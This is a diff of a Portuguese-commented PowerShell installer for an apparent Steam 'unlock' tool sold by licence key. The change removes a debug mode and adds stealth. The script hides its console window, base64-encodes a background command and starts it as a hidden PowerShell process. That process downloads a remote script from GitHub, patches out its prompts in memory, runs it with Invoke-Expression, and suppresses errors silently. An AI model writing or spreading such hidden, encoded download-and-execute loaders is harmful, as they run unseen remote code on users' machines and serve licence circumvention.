@@ -1,4 +1,7 @@
-# MODO DEBUG ATIVO (Janela não é ocultada)
+# 1. Oculta a janela inicial (Console)
+$showWindow = '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
+$type = Add-Type -MemberDefinition $showWindow -Name "Win32ShowWindow" -Namespace "Win32" -PassThru
+$type::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Add-Type -AssemblyName Microsoft.VisualBasic, System.Windows.Forms
@@ -16,60 +19,48 @@ try {
 
     if ($auth.status -eq "authorized") {
         
-        [System.Windows.Forms.MessageBox]::Show("MODO DEBUG ATIVO.`nUma janela preta do PowerShell ficará aberta.", "Aviso de Debug")
+        [System.Windows.Forms.MessageBox]::Show("STEAM DESBLOQUEADA ATIVADA PERMANENTEMENTE`n(Qualquer erro ative novamente com a mesma chave)`n`nO download iniciou e pode levar cerca de 1 a 2 minutos. Aguarde.", "Sucesso")
 
-        # Usando @' (aspas simples) o PowerShell obedece o texto cegamente
+        # Usando @' garante que o texto será injetado perfeitamente
         $bgTask = @'
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         
         try {
-            Write-Host "----------------------------------------" -ForegroundColor Yellow
-            Write-Host "INICIANDO DEBUG DA INSTALAÇÃO" -ForegroundColor Yellow
-            Write-Host "----------------------------------------" -ForegroundColor Yellow
-            
-            Write-Host "Baixando script original do GitHub..." -ForegroundColor Cyan
+            # Baixa script original
             $s = Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/VenezzaX/SteamFunDependencies/refs/heads/main/steampro.ps1'
             
-            Write-Host "Aplicando injeções de memória (Bypass Absoluto)..." -ForegroundColor Cyan
-            
-            # 1. Troca a pausa do Steamtools por um timer automático de 2 segundos
+            # 1. O SEGREDO DO STEAMTOOLS: Troca o pedido de tecla por uma espera de 2 segundos.
+            # Assim o loop de 5 tentativas nativo do script continua funcionando sozinho.
             $s = $s.Replace('[void][System.Console]::ReadKey($true)', 'Start-Sleep -Seconds 2')
             
-            # 2. Destrói o loop de contagem do Millenium (Muda de $i = $milleniumTimer para $i = -1)
-            # Como a condição é imediatamente falsa, ele pula a espera 100% das vezes e instala direto.
-            $s = $s.Replace('for ($i = $milleniumTimer; $i -ge 0; $i--)', 'for ($i = -1; $i -ge 0; $i--)')
-            
-            # 3. Garante que qualquer outra checagem de tecla seja ignorada
+            # 2. PROTEÇÃO DO MILLENNIUM: Evita crash de "console inexistente" na hora de checar teclas.
+            # Mantém os 5 segundos originais de espera que vão rodar no automático.
             $s = $s.Replace('[Console]::KeyAvailable', '$false')
 
-            Write-Host "Executando script na memória..." -ForegroundColor Green
+            # Executa a instalação
             Invoke-Expression $s
 
-            Write-Host "Baixando aviso final..." -ForegroundColor Cyan
+            # Baixa o aviso e abre no notepad
             $wUrl = "https://raw.githubusercontent.com/RicoSteam/SteamMethod/refs/heads/main/warning.txt"
             $path = "$env:TEMP\warning.txt"
             (New-Object System.Net.WebClient).DownloadFile($wUrl, $path)
             Start-Process notepad.exe $path
             
         } catch {
-            Write-Host "ERRO FATAL: $_" -ForegroundColor Red
-        } finally {
-            Write-Host "`n----------------------------------------" -ForegroundColor Yellow
-            Write-Host "FIM DA EXECUÇÃO." -ForegroundColor Yellow
-            Write-Host "Pressione qualquer tecla para fechar esta janela..." -ForegroundColor White
-            $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
+            # Falha silenciosa em background
         }
 '@
 
         $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($bgTask))
         
-        # MUDANÇA: Substituído '-WindowStyle Hidden' por '-WindowStyle Normal'
-        Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle Normal", "-EncodedCommand", $encoded
+        # Dispara o processo em background absoluto
+        Start-Process powershell.exe -ArgumentList "-NoProfile", "-WindowStyle Hidden", "-EncodedCommand", $encoded -WindowStyle Hidden
+        
         exit
 
     } else {
         [System.Windows.Forms.MessageBox]::Show("Chave inválida ou já vinculada a outro computador.", "Acesso Negado")
     }
 } catch {
-    [System.Windows.Forms.MessageBox]::Show("Erro de network. Detalhe: $($_.Exception.Message)", "Erro")
+    [System.Windows.Forms.MessageBox]::Show("Erro ao validar: Verifique sua chave ou network.`n`nDetalhe: $($_.Exception.Message)", "Erro")
 }
